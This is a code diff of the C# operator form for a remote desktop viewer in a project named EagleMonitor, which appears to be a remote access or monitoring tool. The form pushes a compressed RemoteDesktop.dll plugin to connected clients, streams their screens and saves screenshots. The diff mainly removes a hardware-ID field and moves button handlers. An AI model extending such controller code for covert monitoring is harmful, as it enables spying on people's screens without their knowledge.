@@ -19,45 +19,15 @@ namespace EagleMonitor.Forms
         internal ClientHandler clientHandler { get; set; }
         public bool hasAlreadyConnected { get; set; }
         private string baseIp { get; set; }
-        private string HWID { get; set; }
         private int currentPanelHeight { get; set; }
-        internal RemoteDesktopForm(string baseIp, string HWID)
+
+        internal RemoteDesktopForm(string baseIp)
         {
             this.baseIp = baseIp;
-            this.HWID = HWID;
             InitializeComponent();
             this.currentPanelHeight = panel1.Height;
         }
-        private void closeButton_Click(object sender, EventArgs e)
-        {
-            if (captureGuna2ToggleSwitch.Checked)
-            {
-                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF);
-                remoteViewerPacket.HWID = this.HWID;
-                remoteViewerPacket.baseIp = this.baseIp;
-                this.clientHandler.SendPacket(remoteViewerPacket);
-            }
-
-            this.Close();
-        }
-
-        private void maximizeButton_Click(object sender, EventArgs e)
-        {
-            if (this.WindowState == FormWindowState.Normal)
-            {
-                this.WindowState = FormWindowState.Maximized;
-            }
-            else
-            {
-                this.WindowState = FormWindowState.Normal;
-            }
-        }
-
-        private void minimizeButton_Click(object sender, EventArgs e)
-        {
-            this.WindowState = FormWindowState.Minimized;
-        }
-
+      
         private void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
         {
             if (int.TryParse(intervalGuna2TextBox.Text, out int interval) && captureGuna2ToggleSwitch.Checked)
@@ -65,11 +35,10 @@ namespace EagleMonitor.Forms
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON);
 
                 remoteViewerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1);
-                remoteViewerPacket.HWID = this.HWID;
                 remoteViewerPacket.baseIp = this.baseIp;
                 remoteViewerPacket.width = viewerPictureBox.Width;
                 remoteViewerPacket.height = viewerPictureBox.Height;
-                remoteViewerPacket.format = "JPEG";
+                remoteViewerPacket.format = formatGuna2ComboBox.Text;
                 remoteViewerPacket.quality = qualityGuna2TrackBar.Value;
                 remoteViewerPacket.timeMS = interval;
 
@@ -84,7 +53,6 @@ namespace EagleMonitor.Forms
                 this.loadingCircle1.Active = false;
 
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF);
-                remoteViewerPacket.HWID = this.HWID;
                 remoteViewerPacket.baseIp = this.baseIp;
                 this.clientHandler.SendPacket(remoteViewerPacket);
             }
@@ -97,7 +65,6 @@ namespace EagleMonitor.Forms
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON);
 
                 remoteViewerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1);
-                remoteViewerPacket.HWID = this.HWID;
                 remoteViewerPacket.baseIp = this.baseIp;
                 remoteViewerPacket.width = viewerPictureBox.Width;
                 remoteViewerPacket.height = viewerPictureBox.Height;
@@ -116,7 +83,6 @@ namespace EagleMonitor.Forms
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON);
 
                 remoteViewerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1);
-                remoteViewerPacket.HWID = this.HWID;
                 remoteViewerPacket.baseIp = this.baseIp;
                 remoteViewerPacket.width = viewerPictureBox.Width;
                 remoteViewerPacket.height = viewerPictureBox.Height;
@@ -139,7 +105,6 @@ namespace EagleMonitor.Forms
 
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON);
 
-                remoteViewerPacket.HWID = this.HWID;
                 remoteViewerPacket.baseIp = this.baseIp;
                 remoteViewerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1);
                 remoteViewerPacket.width = viewerPictureBox.Width;
@@ -158,7 +123,6 @@ namespace EagleMonitor.Forms
             {
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON);
 
-                remoteViewerPacket.HWID = this.HWID;
                 remoteViewerPacket.baseIp = this.baseIp;
                 remoteViewerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1);
                 remoteViewerPacket.width = viewerPictureBox.Width;
@@ -203,6 +167,35 @@ namespace EagleMonitor.Forms
             string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();
 
             File.WriteAllBytes(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\" + "Screenshots\\" + Date + "." + this.formatGuna2ComboBox.Text.ToLower(), PacketLib.Utils.ImageProcessing.ImageToBytes(this.viewerPictureBox.Image));
+        }
+
+        private void closeButton_Click(object sender, EventArgs e)
+        {
+            if (captureGuna2ToggleSwitch.Checked)
+            {
+                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF);
+                remoteViewerPacket.baseIp = this.baseIp;
+                this.clientHandler.SendPacket(remoteViewerPacket);
+            }
+
+            this.Close();
+        }
+
+        private void maximizeButton_Click(object sender, EventArgs e)
+        {
+            if (this.WindowState == FormWindowState.Normal)
+            {
+                this.WindowState = FormWindowState.Maximized;
+            }
+            else
+            {
+                this.WindowState = FormWindowState.Normal;
+            }
+        }
+
+        private void minimizeButton_Click(object sender, EventArgs e)
+        {
+            this.WindowState = FormWindowState.Minimized;
         }
     }
 }
